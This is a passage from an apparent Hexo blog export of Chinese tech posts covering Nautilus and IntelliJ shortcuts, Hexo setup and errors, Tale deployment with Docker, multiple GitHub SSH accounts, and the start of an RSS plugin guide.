<h2 id="更换文件管理器"><a href="#更换文件管理器" class="headerlink" title="更换文件管理器"></a>更换文件管理器</h2><h3 id="Nautilus"><a href="#Nautilus" class="headerlink" title="Nautilus"></a>Nautilus</h3><ol>
<li>深度商店下载安装 Nautilus<br>2）卸载深度任务管理器<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo apt remove dde-file-manager</span><br></pre></td></tr></table></figure>
Nautilus 常用的快捷键</li>
</ol>
<table>
<thead>
<tr>
<th align="left">快捷键</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left">F2</td>
<td align="left">重命名</td>
</tr>
<tr>
<td align="left">Ctrl + 1</td>
<td align="left">图标视图</td>
</tr>
<tr>
<td align="left">Ctrl + 2</td>
<td align="left">列表视图</td>
</tr>
<tr>
<td align="left">Ctrl + T</td>
<td align="left">新建标签页</td>
</tr>
<tr>
<td align="left">Ctrl + W</td>
<td align="left">关闭标签页</td>
</tr>
<tr>
<td align="left">Alt + 数字</td>
<td align="left">切换到指定标签页</td>
</tr>
<tr>
<td align="left">Ctrl + D</td>
<td align="left">收藏到当前文件夹到书签</td>
</tr>
<tr>
<td align="left">Shift + F10</td>
<td align="left">打开鼠标右键菜单</td>
</tr>
<tr>
<td align="left">Alt + 左方向键</td>
<td align="left">后退</td>
</tr>
<tr>
<td align="left">Alt + 右方向键</td>
<td align="left">前进</td>
</tr>
<tr>
<td align="left">Ctrl + Q</td>
<td align="left">退出</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>yelog</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>运维</tag>
        <tag>deepin</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo报错合集</title>
    <url>//hexo-error-collection</url>
    <content><![CDATA[<h2 id="hexo-server时报错"><a href="#hexo-server时报错" class="headerlink" title="hexo server时报错"></a>hexo server时报错</h2><h3 id="FATAL-watch-…-ENOSPC"><a href="#FATAL-watch-…-ENOSPC" class="headerlink" title="FATAL watch … ENOSPC"></a>FATAL watch … ENOSPC</h3><p>日志：2017-03-27 执行 <code>hexo server</code> 后报错。<br><strong>如图：</strong><br><img src="http://img.saodiyang.com/FqCfDl6mN_Pb1_iH8fRuC5sz4A6o.png" class="lazyload" data-srcset="http://img.saodiyang.com/FqCfDl6mN_Pb1_iH8fRuC5sz4A6o.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="watch ENOSPC"><br><strong>分析问题：</strong><br>node.js 中 watch 的文件数是有限制的。<br><strong>解决问题：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> fs.inotify.max_user_watches=524288 | sudo tee -a /etc/sysctl.conf &amp;&amp; sudo sysctl -p</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>idea常用快捷键</title>
    <url>//idea-shortcuts</url>
    <content><![CDATA[<blockquote>
<p>工欲善其事 , 必先利其器</p>
</blockquote>
<span id="more"></span>
<p>Idea作为IDE是相当niubility,但是要运用自如还得掌握一些常用快捷键,才能在开发过程中运用自如<br>以下是idea的默认快捷键,如果英语能力没有问题,可以在Help-&gt;Keymap Reference 查看官方文档<br>当然作为一款优秀的IDE,怎么会少了自定义快捷键(File-&gt;Setting-&gt;Keymap,可通过动作名/快捷键组合双向查找)<br>好了,下面是博主在Java相关开发过程中常用到的一些快捷键</p>
<h2 id="常用快捷键组合"><a href="#常用快捷键组合" class="headerlink" title="常用快捷键组合"></a>常用快捷键组合</h2><h3 id="编辑"><a href="#编辑" class="headerlink" title="编辑"></a>编辑</h3><table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">快捷键组合</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left">Ctrl+D</td>
<td align="left">重复光标所在行/或选中部分</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+C</td>
<td align="left">复制光标所在行/或选中部分</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+V</td>
<td align="left">粘贴</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+Shift+V</td>
<td align="left">选择粘贴最近5次复制的内容</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+X</td>
<td align="left">删除光标所在行/或选中部分</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+Y</td>
<td align="left">删除光标所在行/或选中行</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Shift+Enter</td>
<td align="left">向下插入新行</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Alt+Shift+↑/↓</td>
<td align="left">移动当前行到上/下一行</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+Alt+←/→</td>
<td align="left">定位到上/下一次光标位置</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+I</td>
<td align="left">实现接口方法</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+Shift+o</td>
<td align="left">删除没用的import</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+O</td>
<td align="left">重写父类方法</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+W</td>
<td align="left">选中当前单词</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+P</td>
<td align="left">提示参数</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+Q</td>
<td align="left">查看方法/类的注释文档</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+Alt+L</td>
<td align="left">格式化当前模板</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+/</td>
<td align="left">注释当前行,或选中行</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+Shift+/</td>
<td align="left">注释选中部分</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">/**+回车(类/方法/属性前)</td>
<td align="left">添加注释</td>
</tr>
</tbody></table>
<h3 id="搜索-替换"><a href="#搜索-替换" class="headerlink" title="搜索/替换"></a>搜索/替换</h3><table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">快捷键组合</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left">Ctrl+N</td>
<td align="left">通过类名(文件名)的关键字快速打开文件(仅限.java文件)</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+Shift+N</td>
<td align="left">通过文件名关键字快速打开文件</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+Shift+N(两次)</td>
<td align="left">通过文件名关键字快速打开文件(包括非本项目内文件,如Maven引入的)</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+Shift+Alt+N</td>
<td align="left">通过关键字(包括类名/方法名/url映射)快速打开文件,定位到类名/方法名/url映射的方法</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+F</td>
<td align="left">搜索关键字(支持正则)在当前文件</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">F3</td>
<td align="left">找下一个</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Shift+F3</td>
<td align="left">找上一个</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+R</td>
<td align="left">替换关键字(支持正则)在当前文件</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+Shift+F</td>
<td align="left">在所有文件(可以指定过滤文件)中查找关键字(支持正则)</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Ctrl+Shift+R</td>
<td align="left">在所有文件(可以指定过滤文件)中替换关键字(支持正则)</td>
</tr>
</tbody></table>
<h3 id="debugging"><a href="#debugging" class="headerlink" title="debugging"></a>debugging</h3><table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">快捷键组合</th>
<th align="left">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="left"></td>
<td align="left">F8</td>
<td align="left">Step over(跳过下一行)</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">F7</td>
<td align="left">Step into(跳入当前行调用的方法体内)</td>
</tr>
<tr>
<td align="left"></td>
<td align="left">Shift+F7</td>
<td align="left">Smart Step into(跳过)</td>
</tr>
</tbody></table>
<h3 id="未完待续"><a href="#未完待续" class="headerlink" title="未完待续"></a>未完待续</h3>]]></content>
      <categories>
        <category>yelog</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>IntellijIDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>tale博客搭建及体验</title>
    <url>//tale-build-experience</url>
    <content><![CDATA[<p>不久之前在逛blog时，发现了这款tale，今天抽空搭建了一下，将搭建过程写于此。<br>demo website：<a href="https://tale.biezhi.me/">https://tale.biezhi.me</a></p>
<h2 id="搭建思路"><a href="#搭建思路" class="headerlink" title="搭建思路"></a>搭建思路</h2><p>看了tale作者的(github)[<a href="https://github.com/otale]">https://github.com/otale]</a> 发现有建好docker，所以果断使用docker搭建tale的环境</p>
<h3 id="构建docker镜像"><a href="#构建docker镜像" class="headerlink" title="构建docker镜像"></a>构建docker镜像</h3><p>下载<a href="https://github.com/otale/tale-docker">tale-docker</a>到本地。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载官方Dockerfile</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/otale/tale-docker.git</span><br><span class="line"><span class="comment"># 构建 tale 镜像</span></span><br><span class="line">$ docker build -t tale:1.0 .</span><br></pre></td></tr></table></figure>

<h3 id="下载tale博客文件"><a href="#下载tale博客文件" class="headerlink" title="下载tale博客文件"></a>下载tale博客文件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载压缩包</span></span><br><span class="line">$ sudo wget http://7xls9k.dl1.z0.glb.clouddn.com/tale.zip</span><br><span class="line"></span><br><span class="line"><span class="comment"># 讲解压出来的文件夹移入home目录</span></span><br><span class="line">$ unzip tale.zip</span><br><span class="line">$ mv tale /home</span><br></pre></td></tr></table></figure>

<h3 id="构建tale镜像"><a href="#构建tale镜像" class="headerlink" title="构建tale镜像"></a>构建tale镜像</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d --privileged --hostname tale --name tale \</span><br><span class="line">-v /etc/localtime:/etc/localtime:ro \</span><br><span class="line">-v /home/tale:/var/tale_home -p 80:9000 \</span><br><span class="line">-m 1024m --memory-swap -1 tale:1.0</span><br></pre></td></tr></table></figure>

<h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><p>浏览器进入 <code>127.0.0.1</code> 即可访问<br><img src="http://img.saodiyang.com/FtwT7OgspZR3YjpJhH5VSuUmnLjP.png" class="lazyload" data-srcset="http://img.saodiyang.com/FtwT7OgspZR3YjpJhH5VSuUmnLjP.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="管理后台"><br><img src="http://img.saodiyang.com/FnFBhuwvQ4atG2F2ahdj5PSFF3eL.png" class="lazyload" data-srcset="http://img.saodiyang.com/FnFBhuwvQ4atG2F2ahdj5PSFF3eL.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="首页"><br><img src="http://img.saodiyang.com/Fg1891hUmEATDbFDBgdBsncb4U1U.png" class="lazyload" data-srcset="http://img.saodiyang.com/Fg1891hUmEATDbFDBgdBsncb4U1U.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="文章"></p>
<h2 id="体验"><a href="#体验" class="headerlink" title="体验"></a>体验</h2><h3 id="管理后台"><a href="#管理后台" class="headerlink" title="管理后台"></a>管理后台</h3><ol>
<li>文章支持Markdown和富文本。</li>
<li>文章/评论/友链/标签管理/主题，设置简单，一目了然</li>
<li>支持插件扩展</li>
</ol>
<h3 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h3><ol>
<li>主题简洁（当然支持切换主题）</li>
<li>使用 <code>instantclick</code> ，页面切换流畅</li>
<li>评论系统，简洁易用</li>
<li>搜索只支持文章标题</li>
</ol>
<h3 id="整体"><a href="#整体" class="headerlink" title="整体"></a>整体</h3><ol>
<li>管理简单方便</li>
<li>使用docker后，迁移数据也方便</li>
<li>主题还不是很多</li>
<li>对于常年使用静态blog，手动渲染/发布，使用这个之后还有点小清新。</li>
</ol>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>tale整体不错，值得入手。</p>
<p>不过目前没有笔者喜欢的主题（当然默认主题也不错），暂时不打算更换blog，笔者也打算过一段时间开发一个tale的主题，然后正式迁入tale。</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>tale</tag>
      </tags>
  </entry>
  <entry>
    <title>windows环境下使用hexo搭建blog平台</title>
    <url>//windows-hexo</url>
    <content><![CDATA[<p>之前已经出过几期搭建 <code>hexo</code> 的文章，但是有不少朋友私信说系统是windows的，希望出一期windows环境下的hexo搭建文章。</p>
<p>为此，确保可用性，笔者在linux（笔者的系统环境）环境下安装了windows虚拟机重新演练了一边，确保没有什么漏洞，才写下了此文。</p>
<p>本文会非常详细，以确保没有计算机背景的小白也可以轻松上手</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><p>1).下载：从官网下载windows版本的git,地址在下方。<br><a href="https://git-scm.com/download/win">https://git-scm.com/download/win</a><br>2).安装：双击安装，一直点击下一步即可</p>
<h3 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h3><p>1).下载：从官网下载windows版本的node.js安装包（.msi后缀），地址下方<br><a href="https://nodejs.org/zh-cn/download/">https://nodejs.org/zh-cn/download/</a><br>2).安装：双击安装，一直点击下一步即可</p>
<h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><p>在任意目录如桌面，点击鼠标右键，选择Git Bash Here这一项，打开git bash命令框（前提是git安装成功），如下图<br><img src="http://img.saodiyang.com/FraxkCebAzx-dlPGsUmgcLZRR_Lj.png" class="lazyload" data-srcset="http://img.saodiyang.com/FraxkCebAzx-dlPGsUmgcLZRR_Lj.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="鼠标右键"><br>在打开的命令窗内输入下面的命令进行安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
<p>安装过后，输入 <code>hexo -v</code>，出现下面信息，则表示安装成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo -v</span><br><span class="line">hexo-cli: 1.0.2</span><br><span class="line">os: Windows_NT 6.1.7601 win32 x64</span><br><span class="line">http_parser: 2.7.0</span><br><span class="line">node: 6.10.0</span><br><span class="line">v8: 5.1.281.93</span><br><span class="line">uv: 1.9.1</span><br><span class="line">zlib: 1.2.8</span><br><span class="line">ares: 1.10.1-DEV</span><br><span class="line">icu: 58.2</span><br><span class="line">modules: 48</span><br><span class="line">openssl: 1.0.2k</span><br></pre></td></tr></table></figure>
<h2 id="初始化blog"><a href="#初始化blog" class="headerlink" title="初始化blog"></a>初始化blog</h2><p>进入准备创建blog的目录，同样点击鼠标右键，打开git bash命令框，<br>执行一下命令进行初始化</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init myblog</span><br></pre></td></tr></table></figure>
<p>就会自动创建一个名字为myblog目录，这时本地blog就已经创建好了。<br>进入blog目录，启动 blog</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> myblog</span><br><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>在浏览器输入 <code>127.0.0.1:4000</code>就可以访问到刚刚创建好的blog了。</p>
<h2 id="换皮肤"><a href="#换皮肤" class="headerlink" title="换皮肤"></a>换皮肤</h2><p>如果觉的自带的皮肤太难看。可以根据以下步奏更换皮肤<br>在<a href="https://hexo.io/themes/">官网</a> 可以查看各种各样的皮肤，挑选自己喜欢的皮肤</p>
<p>这里以 <code>3-hexo</code> 这款皮肤为例（这款皮肤是笔者写的，效果可查看 <a href="http://yelog.org/">yelog.org</a>）<br>1）进入皮肤的 <code>github</code> 官网，如<a href="https://github.com/yelog/hexo-theme-3-hexo">3-hexo</a>的网址<br>找到 <code>clone or download</code> ,复制它的url：<a href="https://github.com/yelog/hexo-theme-3-hexo.git">https://github.com/yelog/hexo-theme-3-hexo.git</a></p>
<p>2）进入 <code>myblog</code> 目录，打开 <code>git bash</code> 命令框，执行以下命令将皮肤下载到themes目录下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/yelog/hexo-theme-3-hexo.git themes/3-hexo</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>修改 <code>myblog/_config.yml</code> 中的 <code>theme: landscape</code> 为 <code>theme: 3-hexo</code></li>
</ol>
<blockquote>
<p>如果使用 <code>3-hexo</code> 主题的话，还需要注意两点<br>①因为主题使用了自己的高亮效果，还需要修改 <code>highlight enable: true</code> 的 <code>true</code> 改为 <code>false</code>。<br>②由于主题启用了文章字数统计功能，需要安装一个插件，在 <code>myblog</code> 目录下，打开 <code>git bash</code> 命令框，执行 <code>npm i --save hexo-wordcount</code> 即可</p>
</blockquote>
<ol start="4">
<li><p>重新渲染，启动服务器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure></li>
<li><p>打开浏览器查看效果，换肤成功</p>
</li>
</ol>
<h2 id="如何写文章"><a href="#如何写文章" class="headerlink" title="如何写文章"></a>如何写文章</h2><p>文章在 <code>myblog/source/_posts/</code> 下，以markdown格式写成，笔者推荐使用<code>atom</code>作为写作工具。<br>可以通过 <code>hexo new 文章名</code> 来创建一篇文章，当然也可以直接在 <code>_posts</code> 目录下直接新建.md文件。<br>执行命令 仍是在 <code>myblog</code> 目录下，打开 <code>git bash</code> 命令框。以下是常用命令，其他可以查阅官网。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建一个标题为“git教程”的文章</span></span><br><span class="line">$ hexo new <span class="string">&quot;git教程&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 清除所有渲染的页面</span></span><br><span class="line">$ hexo clean</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将markdown渲染成页面</span></span><br><span class="line">$ hexo g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动hexo</span></span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure>

<h2 id="发布到网上"><a href="#发布到网上" class="headerlink" title="发布到网上"></a>发布到网上</h2><p>如果想要在github上搭建blog，或者在自己的购买的服务器上搭建blog<br>可以查看笔者的往期文章</p>
<p>今天的教程就到这里，有什么问题可以在评论区交流。</p>
]]></content>
      <categories>
        <category>yelog</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>一个客户端设置多个github账号</title>
    <url>//computer-mutiple-github-account</url>
    <content><![CDATA[<p>最近想要使用自己的GitHub搭建Hexo博客，同时还要使用工作的GitHub开发项目，所以在网上找寻了一些文章，在此将自己的搭建过程记录一下。</p>
<span id="more"></span>
<h2 id="前期工作"><a href="#前期工作" class="headerlink" title="前期工作"></a>前期工作</h2><p>两个GitHub账号（假设两个账号为one,two）<br>取消Git全局设置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global --<span class="built_in">unset</span> user.name</span><br><span class="line">$ git config --global --<span class="built_in">unset</span> user.email</span><br></pre></td></tr></table></figure>
<h2 id="SSH配置"><a href="#SSH配置" class="headerlink" title="SSH配置"></a>SSH配置</h2><p>生成<code>id_rsa</code>私钥，<code>id_rsa.pub</code>公钥。one可以直接回车，默认生成 id_rsa 和 id_rsa.pub 。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;one@xx.com&quot;</span></span><br></pre></td></tr></table></figure>
<p>添加two会出现提示输入文件名，输入与默认配置不一样的文件名，如：id_rsa_two。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/.ssh</span><br><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;two@126.com&quot;</span>  <span class="comment">#  之后会提示输入文件名</span></span><br></pre></td></tr></table></figure>
<p>GitHub添加公钥 id_rsa.pub 、 id_rsa_two.pub，分别登陆one,two的账号，在 Account Settings 的 SSH Keys 里，点 <code>Add SSH Keys</code> ，将公钥(.pub文件)中的内容粘贴到 Key 中，并输入 Title。<br>添加 ssh Key</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-add ~/.ssh/id_rsa</span><br><span class="line">$ ssh-add ~/.ssh/id_rsa_two</span><br></pre></td></tr></table></figure>
<p>可以在添加前使用下面命令删除所有的 key</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-add -D</span><br></pre></td></tr></table></figure>
<p>最后可以通过下面命令，查看 key 的设置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-add -l</span><br></pre></td></tr></table></figure>
<h2 id="修改ssh-config文件"><a href="#修改ssh-config文件" class="headerlink" title="修改ssh config文件"></a>修改ssh config文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/.ssh/</span><br><span class="line">$ touch config</span><br></pre></td></tr></table></figure>
<p>打开 .ssh 文件夹下的 <code>config</code> 文件，进行配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#  default</span></span><br><span class="line"><span class="string">Host</span> <span class="string">github.com</span></span><br><span class="line"><span class="string">HostName</span> <span class="string">github.com</span></span><br><span class="line"><span class="string">User</span> <span class="string">git</span></span><br><span class="line"><span class="string">IdentityFile</span> <span class="string">~/.ssh/id_rsa</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  two</span></span><br><span class="line"><span class="string">Host</span> <span class="string">two.github.com</span>  <span class="comment">#  前缀名可以任意设置</span></span><br><span class="line"><span class="string">HostName</span> <span class="string">github.com</span></span><br><span class="line"><span class="string">User</span> <span class="string">git</span></span><br><span class="line"><span class="string">IdentityFile</span> <span class="string">~/.ssh/id_rsa_two</span></span><br></pre></td></tr></table></figure>
<ul>
<li>这里必须采用这样的方式设置，否则 push 时会出现以下错误:</li>
</ul>
<blockquote>
<p>ERROR: Permission to two/two.github.com.git denied to one.</p>
</blockquote>
<p>简单分析下原因，我们可以发现 ssh 客户端是通过类似:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git@github.com:one/one.github.com.git</span><br></pre></td></tr></table></figure>

<p>这样的 Git 地址中的 User 和 Host 来识别使用哪个本地私钥的。<br>很明显，如果 User 和 Host 始终为 git 和 github.com，那么就只能使用一个私钥。<br>所以需要上面的方式配置，每个账号使用了自己的 Host，每个 Host 的域名做 CNAME 解析到 github.com，这样 ssh 在连接时就可以区别不同的账号了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@github.com        <span class="comment">#  测试one ssh连接</span></span><br><span class="line"><span class="comment"># Hi ***! You&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br><span class="line">$ ssh -T git@two.github.com    <span class="comment">#  测试two ssh连接</span></span><br><span class="line"><span class="comment"># Hi ***! You&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></figure>
<p>但是这样还没有完，下面还有关联的设置。</p>
<h2 id="在Git项目中配置账号关联"><a href="#在Git项目中配置账号关联" class="headerlink" title="在Git项目中配置账号关联"></a>在Git项目中配置账号关联</h2><p>可以用 <code>git init</code> 或者 <code>git clone</code> 创建本地项目<br>分别在one和two的git项目目录下，使用下面的命令设置名字和邮箱</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config user.name <span class="string">&quot;__name__&quot;</span>            <span class="comment">#  __name__ 例如 one</span></span><br><span class="line">$ git config user.email <span class="string">&quot;__email__&quot;</span>          <span class="comment">#  __email__ 例如 one@126.com</span></span><br></pre></td></tr></table></figure>
<p>注意：由于我不知道Hexo怎样配置 局部的config，所以，我将two的config使用全局，而工作目录配置局部。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">&quot;__name__&quot;</span>            <span class="comment">#  __name__ 例如 two</span></span><br><span class="line">$ git config --global user.email <span class="string">&quot;__email__&quot;</span>          <span class="comment">#  __email__ 例如 two@126.com</span></span><br></pre></td></tr></table></figure>
<p>查看git项目的配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --list</span><br></pre></td></tr></table></figure>
<p>查看 one 的 remote.origin.url=<a href="mailto:&#103;&#x69;&#116;&#64;&#x67;&#x69;&#116;&#x68;&#x75;&#x62;&#46;&#x63;&#111;&#x6d;">&#103;&#x69;&#116;&#64;&#x67;&#x69;&#116;&#x68;&#x75;&#x62;&#46;&#x63;&#111;&#x6d;</a>:one/one.github.com.git<br>查看 two 的 remote.origin.url=<a href="mailto:&#103;&#105;&#x74;&#x40;&#x67;&#105;&#x74;&#104;&#x75;&#98;&#46;&#x63;&#x6f;&#109;">&#103;&#105;&#x74;&#x40;&#x67;&#105;&#x74;&#104;&#x75;&#98;&#46;&#x63;&#x6f;&#109;</a>:two/two.github.com.git<br>由于 one 使用的是默认的 Host ，所以不需要修改，但是 two 使用的是 two.github.com ，则需要进行修改</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git remote rm origin</span><br><span class="line">$ git remote add origin git@two.github.com:two/two.github.com.git</span><br></pre></td></tr></table></figure>
<p>我在Hexo中的配置（使用two账号）</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repo:</span> <span class="string">git@two.github.com:two/two.github.io.git</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>
<h2 id="上传更改"><a href="#上传更改" class="headerlink" title="上传更改"></a>上传更改</h2><p>上面所有的设置无误后，可以修改代码，然后上传了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git add -A</span><br><span class="line">$ git commit -m <span class="string">&quot;your comments&quot;</span></span><br><span class="line">$ git push</span><br></pre></td></tr></table></figure>
<p>如果遇到warning</p>
<blockquote>
<p>warning: push.default is unset; its implicit value is changing in Git 2.0 from ‘matching’ to ‘simple’. To squelch this messageand maintain the current behavior after the default changes, use…</p>
</blockquote>
<p>推荐使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global push.default simple</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>yelog</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>GitHub</tag>
      </tags>
  </entry>
  <entry>
    <title>为Hexo添加RSS和Sitemap</title>
    <url>//Hexo-RSS-Sitemap</url>
    <content><![CDATA[<h2 id="添加RSS"><a href="#添加RSS" class="headerlink" title="添加RSS"></a>添加RSS</h2><p>使用<code>RSS</code>是为自己的blog提供订阅功能。</p>
<h3 id="1-用npm安装插件"><a href="#1-用npm安装插件" class="headerlink" title="1.用npm安装插件"></a>1.用<code>npm</code>安装插件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure>
